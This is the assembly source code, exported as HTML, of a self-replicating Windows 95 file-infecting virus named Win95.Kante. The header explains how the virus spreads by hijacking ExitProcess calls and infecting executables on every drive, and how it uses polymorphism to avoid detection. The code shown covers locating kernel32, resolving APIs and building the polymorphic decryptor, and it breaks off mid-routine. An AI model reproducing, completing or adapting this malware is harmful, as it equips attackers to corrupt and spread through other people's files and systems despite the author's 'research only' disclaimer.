<!DOCTYPE html PUBLIC "-//W3C//DTD HTML 4.01//EN" "http://www.w3.org/TR/1999/REC-html401-19991224/strict.dtd">
<html>
<head>
<META http-equiv=Content-Type content="text/html; charset=windows-1252">
<title>Exported from Notepad++</title>
<style type="text/css">
span {
	font-family: 'Courier New';
	font-size: 10pt;
	color: #000000;
}
.sc0 {
}
.sc1 {
	color: #008000;
}
.sc2 {
	color: #FF8000;
}
.sc3 {
	color: #808080;
}
.sc4 {
	font-weight: bold;
	color: #000080;
}
.sc5 {
}
.sc6 {
	font-weight: bold;
	color: #0000FF;
}
.sc8 {
	font-weight: bold;
	color: #8080FF;
}
.sc9 {
	color: #0080FF;
}
.sc10 {
	font-weight: bold;
	color: #000080;
}
</style>
</head>
<body>
<div style="float: left; white-space: pre; line-height: 1; background: #FFFFFF; "><span class="sc1">; comment ~</span><span class="sc0">
</span><span class="sc1">; </span><span class="sc0">
</span><span class="sc1">; NAME: Win95.Kante</span><span class="sc0">
</span><span class="sc1">; AUTHOR: Black Jack [independant Austrian Win32asm virus coder]</span><span class="sc0">
</span><span class="sc1">; CONTACT: Black_Jack_VX@hotmail.com | http://blackjackvx.cjb.net</span><span class="sc0">
</span><span class="sc1">; TYPE: Win95 semi-resident light-poly PE midfile infector with EPO</span><span class="sc0">
</span><span class="sc1">; SIZE: 2016 bytes (+decryptor size)</span><span class="sc0">
</span><span class="sc1">; </span><span class="sc0">
</span><span class="sc1">; DESCRIPTION:</span><span class="sc0">
</span><span class="sc1">; The virus usually gains control when an infected file quits (this is due to</span><span class="sc0">
</span><span class="sc1">; its EPO feature). First the light-poly decryptor decrypts the virus body into</span><span class="sc0">
</span><span class="sc1">; a writeable section of the host and gives control to it. The virus then fully</span><span class="sc0">
</span><span class="sc1">; takes control of the hosts task, and starts scanning recursively for infect-</span><span class="sc0">
</span><span class="sc1">; able files on all drives and in all directories in the background. Files are</span><span class="sc0">
</span><span class="sc1">; infected by adding the virus body to the virtual end of one section (that can</span><span class="sc0">
</span><span class="sc1">; be somewhere in the middle of the file), if it fits in between there and the</span><span class="sc0">
</span><span class="sc1">; virtual start of the next section, the rest of the file is shifted back. This</span><span class="sc0">
</span><span class="sc1">; means that the physical size of the infected section is equal to its virtual</span><span class="sc0">
</span><span class="sc1">; size after infection, and they go up to the virtual start of the next section.</span><span class="sc0">
</span><span class="sc1">; Besides that a writeable section is searched and its RVA saved; the poly</span><span class="sc0">
</span><span class="sc1">; decryptor will decrypt the virus over there at runtime, thats why it is not</span><span class="sc0">
</span><span class="sc1">; necessary to modify the flags of any section.</span><span class="sc0">
</span><span class="sc1">; Before the file modification the victims code section was scanned for a</span><span class="sc0">
</span><span class="sc1">; JMP [imm32] or a CALL [imm32] to the ExitProcess API, this jmp/call will now</span><span class="sc0">
</span><span class="sc1">; be replaced with a jmp/call to the virus body. The virus uses no explicit</span><span class="sc0">
</span><span class="sc1">; infection marker, thats why multiple infections are possible, but each</span><span class="sc0">
</span><span class="sc1">; call to the ExitProcess API can be infected only once (and most HLL generated</span><span class="sc0">
</span><span class="sc1">; programs contain only one ExitProcess call), and also each section can only</span><span class="sc0">
</span><span class="sc1">; be infected once (and many sections can't be infected at all), that's why</span><span class="sc0">
</span><span class="sc1">; infected files won't grow infinitely.</span><span class="sc0">
</span><span class="sc1">; The virus body is also slightly polymorphic. The combination of not changing</span><span class="sc0">
</span><span class="sc1">; the section flags, EPO, midfile-infection and polymorphism should make the</span><span class="sc0">
</span><span class="sc1">; virus very hard to detect, I hope.</span><span class="sc0">
</span><span class="sc1">; </span><span class="sc0">
</span><span class="sc1">; POLY:</span><span class="sc0">
</span><span class="sc1">; First I have coded a quite neat poly engine for this virus. Then, when I</span><span class="sc0">
</span><span class="sc1">; wanted to add it, I found out that it would make this virus too big (the size</span><span class="sc0">
</span><span class="sc1">; of the virus body is limited to about 2 or 3 KB because of the midfile</span><span class="sc0">
</span><span class="sc1">; infection technique used). So I coded a very simple (and small) pseudo-</span><span class="sc0">
</span><span class="sc1">; poly engine for this virus. All it does is exchange the registers used in a</span><span class="sc0">
</span><span class="sc1">; static decryptor and add some basic junk opcodes, so it is basically a joke.</span><span class="sc0">
</span><span class="sc1">; But still I hope it will make detection at least a little more difficult</span><span class="sc0">
</span><span class="sc1">; combined with the other anti-detection techniques used in this virus. And,</span><span class="sc0">
</span><span class="sc1">; btw, my real poly engine will be used in my next creation, of course.</span><span class="sc0">
</span><span class="sc1">; </span><span class="sc0">
</span><span class="sc1">; COMMENTS:</span><span class="sc0">
</span><span class="sc1">; I lost interest in working on this virus any further, that's why I release it</span><span class="sc0">
</span><span class="sc1">; in this kinda unfinished form. It's unoptimised, partially uncommented and</span><span class="sc0">
</span><span class="sc1">; not tested enough, which means that there could be some bugs left. The main</span><span class="sc0">
</span><span class="sc1">; bug is that it won't work in WinNT, although it should theoretically, but I</span><span class="sc0">
</span><span class="sc1">; don't know why it doesn't, and really don't want to waste more time searching</span><span class="sc0">
</span><span class="sc1">; that silly bug, sorry.</span><span class="sc0">
</span><span class="sc1">; </span><span class="sc0">
</span><span class="sc1">; ASSEMBLE WITH: </span><span class="sc0">
</span><span class="sc1">;                 tasm32 /mx /m kante.asm</span><span class="sc0">
</span><span class="sc1">;                 tlink32 /Tpe /aa kante.obj,,, import32.lib</span><span class="sc0">
</span><span class="sc1">; </span><span class="sc0">
</span><span class="sc1">;                 there's no need for PEWRSEC or a similar tool, because the</span><span class="sc0">
</span><span class="sc1">;                 virus code is stored in the data section.</span><span class="sc0">
</span><span class="sc1">; </span><span class="sc0">
</span><span class="sc1">; DISCLAIMER: I do *NOT* support the spreading of viruses in the wild.</span><span class="sc0">
</span><span class="sc1">;             Therefore, this source was only written for research and</span><span class="sc0">
</span><span class="sc1">;             education. Please do not spread it. The author can't be hold</span><span class="sc0">
</span><span class="sc1">;             responsible for what you decide to do with this source.</span><span class="sc0">
</span><span class="sc1">; </span><span class="sc0">
</span><span class="sc1">; ~</span><span class="sc0">
</span><span class="sc1">; ===========================================================================</span><span class="sc0">

</span><span class="sc5">workspace</span><span class="sc0">               </span><span class="sc9">EQU</span><span class="sc0"> </span><span class="sc2">100000</span><span class="sc0">
</span><span class="sc5">virus_size</span><span class="sc0">              </span><span class="sc9">EQU</span><span class="sc0"> </span><span class="sc4">(</span><span class="sc5">virus_end</span><span class="sc0"> </span><span class="sc4">-</span><span class="sc0"> </span><span class="sc5">virus_start</span><span class="sc4">)</span><span class="sc0">
</span><span class="sc5">size_mem_buffer</span><span class="sc0">         </span><span class="sc9">EQU</span><span class="sc0"> </span><span class="sc4">((</span><span class="sc9">size</span><span class="sc0"> </span><span class="sc5">main_data</span><span class="sc4">)</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc5">virus_size</span><span class="sc4">)</span><span class="sc0">

</span><span class="sc9">Extrn</span><span class="sc0"> </span><span class="sc5">MessageBoxA</span><span class="sc4">:</span><span class="sc9">Proc</span><span class="sc0">

</span><span class="sc2">.386p</span><span class="sc0">
</span><span class="sc9">.model</span><span class="sc0"> </span><span class="sc10">flat</span><span class="sc0">
</span><span class="sc9">.data</span><span class="sc0">
</span><span class="sc5">virus_start</span><span class="sc4">:</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">next</span><span class="sc0">                               </span><span class="sc1">; get the delta offset</span><span class="sc0">
</span><span class="sc5">delta</span><span class="sc4">:</span><span class="sc0">

</span><span class="sc5">loop_head</span><span class="sc0">       </span><span class="sc9">dd</span><span class="sc0"> </span><span class="sc10">?</span><span class="sc0">
</span><span class="sc5">mem_buffer</span><span class="sc0">      </span><span class="sc9">dd</span><span class="sc0"> </span><span class="sc10">?</span><span class="sc0">

                </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc3">"Win95.Kante by Black Jack, Austria, 2001"</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">

</span><span class="sc1">; Kante is a great band from Germany. I named this virus in their honour,</span><span class="sc0">
</span><span class="sc1">; because around the same time I finished this virus, I saw them live, and</span><span class="sc0">
</span><span class="sc1">; it was a really wounderful performance.</span><span class="sc0">

</span><span class="sc5">next</span><span class="sc4">:</span><span class="sc0">
        </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">ebp</span><span class="sc0">
        </span><span class="sc6">sub</span><span class="sc0"> </span><span class="sc8">ebp</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">(</span><span class="sc5">delta</span><span class="sc4">-</span><span class="sc5">virus_start</span><span class="sc4">)</span><span class="sc0">


</span><span class="sc1">; This method to get the kernel32 base address with the last SEH frame was</span><span class="sc0">
</span><span class="sc1">; described in an article in Top Device online some time ago. Unfortunately,</span><span class="sc0">
</span><span class="sc1">; I don't remember who the original author was, anyways full credits go to him</span><span class="sc0">

        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">fs</span><span class="sc4">:[</span><span class="sc2">0</span><span class="sc4">]</span><span class="sc0">                         </span><span class="sc1">; EAX=first SEH frame</span><span class="sc0">

</span><span class="sc5">search_last_SEH</span><span class="sc4">:</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ebx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">eax</span><span class="sc4">]</span><span class="sc0">                          </span><span class="sc1">; EBX=next SEH frame</span><span class="sc0">
        </span><span class="sc6">inc</span><span class="sc0"> </span><span class="sc8">ebx</span><span class="sc0">                                 </span><span class="sc1">; EBX=-1 means we have reached</span><span class="sc0">
                                                </span><span class="sc1">; the last SEH frame</span><span class="sc0">
        </span><span class="sc6">JZ</span><span class="sc0"> </span><span class="sc5">found_last_SEH</span><span class="sc0">
        </span><span class="sc6">dec</span><span class="sc0"> </span><span class="sc8">ebx</span><span class="sc0">
        </span><span class="sc6">xchg</span><span class="sc0"> </span><span class="sc8">ebx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">                           </span><span class="sc1">; EAX=next SEH frame</span><span class="sc0">
        </span><span class="sc6">JMP</span><span class="sc0"> </span><span class="sc5">search_last_SEH</span><span class="sc0">

</span><span class="sc5">found_last_SEH</span><span class="sc4">:</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">eax</span><span class="sc4">+</span><span class="sc2">4</span><span class="sc4">]</span><span class="sc0">                        </span><span class="sc1">; EAX=last SEH handler</span><span class="sc0">
                                                </span><span class="sc1">; (which is always in k32)</span><span class="sc0">

</span><span class="sc5">search_MZ</span><span class="sc4">:</span><span class="sc0">
        </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">eax</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc3">"ZM"</span><span class="sc0">                </span><span class="sc1">; is there an MZ header ?</span><span class="sc0">
        </span><span class="sc6">JE</span><span class="sc0"> </span><span class="sc5">found_MZ</span><span class="sc0">
</span><span class="sc5">not_found_MZ</span><span class="sc4">:</span><span class="sc0">
        </span><span class="sc6">dec</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">                                 </span><span class="sc1">; scan downwards</span><span class="sc0">
        </span><span class="sc6">JMP</span><span class="sc0"> </span><span class="sc5">search_MZ</span><span class="sc0">

</span><span class="sc5">found_MZ</span><span class="sc4">:</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ebx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">eax</span><span class="sc4">+</span><span class="sc2">3Ch</span><span class="sc4">]</span><span class="sc0">                      </span><span class="sc1">; EBX=new header RVA</span><span class="sc0">
        </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc8">ebx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">1024</span><span class="sc0">                           </span><span class="sc1">; is it small enough ?</span><span class="sc0">
        </span><span class="sc6">JNB</span><span class="sc0"> </span><span class="sc5">not_found_MZ</span><span class="sc0">                        </span><span class="sc1">; if not, scan on</span><span class="sc0">
        </span><span class="sc6">add</span><span class="sc0"> </span><span class="sc8">ebx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">                            </span><span class="sc1">; EBX=PE header offset</span><span class="sc0">
        </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebx</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc3">"EP"</span><span class="sc0">               </span><span class="sc1">; is there a PE header ?</span><span class="sc0">
        </span><span class="sc6">JNE</span><span class="sc0"> </span><span class="sc5">not_found_MZ</span><span class="sc0">                        </span><span class="sc1">; if not, scan on</span><span class="sc0">

        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ebx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebx</span><span class="sc4">+</span><span class="sc2">120</span><span class="sc4">]</span><span class="sc0">                      </span><span class="sc1">; EBX=export table RVA</span><span class="sc0">
        </span><span class="sc6">add</span><span class="sc0"> </span><span class="sc8">ebx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">                            </span><span class="sc1">; RVA-&gt;VA</span><span class="sc0">

        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebx</span><span class="sc4">+</span><span class="sc2">20h</span><span class="sc4">]</span><span class="sc0">                      </span><span class="sc1">; ESI=AddressOfNames RVA</span><span class="sc0">
        </span><span class="sc6">add</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">                            </span><span class="sc1">; RVA-&gt;VA</span><span class="sc0">

</span><span class="sc5">search_GPA_loop</span><span class="sc4">:</span><span class="sc0">
        </span><span class="sc6">xchg</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">edi</span><span class="sc0">                           </span><span class="sc1">; save EAX (kernel32 base)</span><span class="sc0">
        </span><span class="sc6">lodsd</span><span class="sc0">                                   </span><span class="sc1">; EAX=a API name RVA</span><span class="sc0">
        </span><span class="sc6">xchg</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">edi</span><span class="sc0">
        </span><span class="sc6">add</span><span class="sc0"> </span><span class="sc8">edi</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">                            </span><span class="sc1">; RVA-&gt;VA</span><span class="sc0">

        </span><span class="sc6">pusha</span><span class="sc0">                                   </span><span class="sc1">; save all registers</span><span class="sc0">
        </span><span class="sc6">lea</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">n_GetProcAddress</span><span class="sc4">-</span><span class="sc5">virus_start</span><span class="sc4">]</span><span class="sc0">  </span><span class="sc1">; ESI="GetProcAddress"</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc5">l_GetProcAddress</span><span class="sc0">         </span><span class="sc1">; ECX=length of API name</span><span class="sc0">
        </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc0">
        </span><span class="sc6">cld</span><span class="sc0">                                     </span><span class="sc1">; clear direction flag</span><span class="sc0">
        </span><span class="sc6">rep</span><span class="sc0"> </span><span class="sc6">cmpsb</span><span class="sc0">                               </span><span class="sc1">; compare the API names</span><span class="sc0">
        </span><span class="sc6">popa</span><span class="sc0">                                    </span><span class="sc1">; restore all registers</span><span class="sc0">
        </span><span class="sc6">JNE</span><span class="sc0"> </span><span class="sc5">search_GPA_loop</span><span class="sc0">                     </span><span class="sc1">; if not equal, search on</span><span class="sc0">


</span><span class="sc5">found_gpa</span><span class="sc4">:</span><span class="sc0">
        </span><span class="sc6">sub</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">                            </span><span class="sc1">; VA-&gt;RVA</span><span class="sc0">
        </span><span class="sc6">sub</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebx</span><span class="sc4">+</span><span class="sc2">20h</span><span class="sc4">]</span><span class="sc0">                      </span><span class="sc1">; subtract AddressOfNames</span><span class="sc0">

        </span><span class="sc6">shr</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">1</span><span class="sc0">                              </span><span class="sc1">; ESI=((ESI/4)*2)-2</span><span class="sc0">
        </span><span class="sc6">dec</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc0">
        </span><span class="sc6">dec</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc0">
        </span><span class="sc6">add</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebx</span><span class="sc4">+</span><span class="sc2">24h</span><span class="sc4">]</span><span class="sc0">                      </span><span class="sc1">; add AddressOfNameOrdinals</span><span class="sc0">

        </span><span class="sc6">movzx</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">eax</span><span class="sc4">+</span><span class="sc8">esi</span><span class="sc4">]</span><span class="sc0">           </span><span class="sc1">; ECX=API ordinal</span><span class="sc0">

        </span><span class="sc6">lea</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ecx</span><span class="sc4">*</span><span class="sc2">4</span><span class="sc4">+</span><span class="sc8">eax</span><span class="sc4">]</span><span class="sc0">                    </span><span class="sc1">; ECX=ordinal*4+k32 base</span><span class="sc0">
        </span><span class="sc6">add</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebx</span><span class="sc4">+</span><span class="sc2">1Ch</span><span class="sc4">]</span><span class="sc0">                      </span><span class="sc1">; add AddressOfFunctions</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ecx</span><span class="sc4">]</span><span class="sc0">                          </span><span class="sc1">; ECX=API RVA</span><span class="sc0">
        </span><span class="sc6">add</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">                            </span><span class="sc1">; RVA-&gt;VA</span><span class="sc0">

        </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">                                </span><span class="sc1">; save kernel32 handle</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc0">                                </span><span class="sc1">; save GetProcAddress VA</span><span class="sc0">

        </span><span class="sc6">lea</span><span class="sc0"> </span><span class="sc8">ebx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">n_GlobalAlloc</span><span class="sc4">-</span><span class="sc5">virus_start</span><span class="sc4">]</span><span class="sc1">; EBX="GlobalAlloc"</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">ebx</span><span class="sc0">                                </span><span class="sc1">; push API name offset</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">                                </span><span class="sc1">; kernel32 handle</span><span class="sc0">
        </span><span class="sc6">CALL</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc0">                                </span><span class="sc1">; call GetProcAddress</span><span class="sc0">

        </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc5">size_mem_buffer</span><span class="sc0">                    </span><span class="sc1">; size to allocate</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">                                  </span><span class="sc1">; flags</span><span class="sc0">
        </span><span class="sc6">CALL</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">                                </span><span class="sc1">; call GlobalAlloc</span><span class="sc0">

        </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">eax.GetProcAddress</span><span class="sc4">]</span><span class="sc0">      </span><span class="sc1">; put GPA API in our buffer</span><span class="sc0">
        </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">eax.kernel32</span><span class="sc4">]</span><span class="sc0">            </span><span class="sc1">; put k32 base in our buffer</span><span class="sc0">

        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">mem_buffer</span><span class="sc4">-</span><span class="sc5">virus_start</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">   </span><span class="sc1">; save mem buffer offset</span><span class="sc0">

</span><span class="sc1">; ----- A BASIC POLY ENGINE -------------------------------------------------</span><span class="sc0">

        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">ebp</span><span class="sc0">                            </span><span class="sc1">; ESI=virus start</span><span class="sc0">
        </span><span class="sc6">lea</span><span class="sc0"> </span><span class="sc8">edi</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">eax.poly_virus_body</span><span class="sc4">]</span><span class="sc0">          </span><span class="sc1">; EDI=poly destination buffer</span><span class="sc0">

        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">bl</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">-</span><span class="sc2">1</span><span class="sc0">                              </span><span class="sc1">; BL holds the register that</span><span class="sc0">
                                                </span><span class="sc1">; will hold the imagebase in</span><span class="sc0">
                                                </span><span class="sc1">; the decryptor</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">cl</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">-</span><span class="sc2">1</span><span class="sc0">                              </span><span class="sc1">; CL holds the register that</span><span class="sc0">
                                                </span><span class="sc1">; will hold the decryption</span><span class="sc0">
                                                </span><span class="sc1">; loop counter</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">dl</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">-</span><span class="sc2">1</span><span class="sc0">                              </span><span class="sc1">; DL holds the register that</span><span class="sc0">
                                                </span><span class="sc1">; will be used to decrypt</span><span class="sc0">

        </span><span class="sc6">CALL</span><span class="sc0"> </span><span class="sc5">get_register</span><span class="sc0">                       </span><span class="sc1">; get a free register</span><span class="sc0">
        </span><span class="sc6">xchg</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">ebx</span><span class="sc0">                           </span><span class="sc1">; save as imagebase register</span><span class="sc0">
        </span><span class="sc6">CALL</span><span class="sc0"> </span><span class="sc5">get_register</span><span class="sc0">                       </span><span class="sc1">; get a free register</span><span class="sc0">
        </span><span class="sc6">xchg</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc0">                           </span><span class="sc1">; save as counter register</span><span class="sc0">
        </span><span class="sc6">CALL</span><span class="sc0"> </span><span class="sc5">get_register</span><span class="sc0">                       </span><span class="sc1">; get a free register</span><span class="sc0">
        </span><span class="sc6">xchg</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">edx</span><span class="sc0">                           </span><span class="sc1">; save as use regiser</span><span class="sc0">

        </span><span class="sc6">CALL</span><span class="sc0"> </span><span class="sc5">add_junk</span><span class="sc0">                           </span><span class="sc1">; add some junk instructions</span><span class="sc0">

        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">bl</span><span class="sc0">                              </span><span class="sc1">; AL=base register</span><span class="sc0">
        </span><span class="sc6">or</span><span class="sc0"> </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0B8h</span><span class="sc0">                             </span><span class="sc1">; mov reg32, imm32</span><span class="sc0">
        </span><span class="sc6">stosb</span><span class="sc0">                                   </span><span class="sc1">; store instruction </span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">edi</span><span class="sc0">                                </span><span class="sc1">; save where to put imagebase</span><span class="sc0">
        </span><span class="sc6">stosd</span><span class="sc0">                                   </span><span class="sc1">; place for imagebase</span><span class="sc0">

        </span><span class="sc6">CALL</span><span class="sc0"> </span><span class="sc5">add_junk</span><span class="sc0">                           </span><span class="sc1">; add some junk instructions</span><span class="sc0">

        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">cl</span><span class="sc0">                              </span><span class="sc1">; AL=counter register</span><span class="sc0">
        </span><span class="sc6">or</span><span class="sc0"> </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0B8h</span><span class="sc0">                             </span><span class="sc1">; mov reg32, imm32</span><span class="sc0">
        </span><span class="sc6">stosb</span><span class="sc0">                                   </span><span class="sc1">; store instruction</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc5">virus_size</span><span class="sc0">                     </span><span class="sc1">; EAX=loop counter init value</span><span class="sc0">
        </span><span class="sc6">stosd</span><span class="sc0">                                   </span><span class="sc1">; store it</span><span class="sc0">

        </span><span class="sc6">CALL</span><span class="sc0"> </span><span class="sc5">add_junk</span><span class="sc0">                           </span><span class="sc1">; add some junk instructions</span><span class="sc0">

        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">loop_head</span><span class="sc4">-</span><span class="sc5">virus_start</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc8">edi</span><span class="sc0">    </span><span class="sc1">; store the loop head</span><span class="sc0">

        </span><span class="sc6">CALL</span><span class="sc0"> </span><span class="sc5">add_junk</span><span class="sc0">                           </span><span class="sc1">; add some junk instructions</span><span class="sc0">

        </span><span class="sc6">xor</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">                            </span><span class="sc1">; EAX=0</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ah</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">dl</span><span class="sc0">                              </span><span class="sc1">; AH=use register</span><span class="sc0">
        </span><span class="sc6">shl</span><span class="sc0"> </span><span class="sc8">ah</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">3</span><span class="sc0">
        </span><span class="sc6">or</span><span class="sc0"> </span><span class="sc8">ah</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">bl</span><span class="sc0">                               </span><span class="sc1">; imagebase register</span><span class="sc0">
        </span><span class="sc6">or</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">808Bh</span><span class="sc0">                            </span><span class="sc1">; mov reg32, [reg32+imm32]</span><span class="sc0">
        </span><span class="sc6">stosw</span><span class="sc0">                                   </span><span class="sc1">; store instruction</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">edi</span><span class="sc0">                                </span><span class="sc1">; save place of RVA (imm32)</span><span class="sc0">
        </span><span class="sc6">stosd</span><span class="sc0">                                   </span><span class="sc1">; store it</span><span class="sc0">

        </span><span class="sc6">CALL</span><span class="sc0"> </span><span class="sc5">add_junk</span><span class="sc0">                           </span><span class="sc1">; add some junk instructions</span><span class="sc0">

        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">81h</span><span class="sc0">                             </span><span class="sc1">; store decrypt instruction:</span><span class="sc0">
        </span><span class="sc6">stosb</span><span class="sc0">                                   </span><span class="sc1">; add reg32, imm32</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0C0h</span><span class="sc0">
        </span><span class="sc6">or</span><span class="sc0"> </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">dl</span><span class="sc0">
        </span><span class="sc6">stosb</span><span class="sc0">
        </span><span class="sc6">CALL</span><span class="sc0"> </span><span class="sc5">get_random</span><span class="sc0">                         </span><span class="sc1">; get a random crypt key</span><span class="sc0">
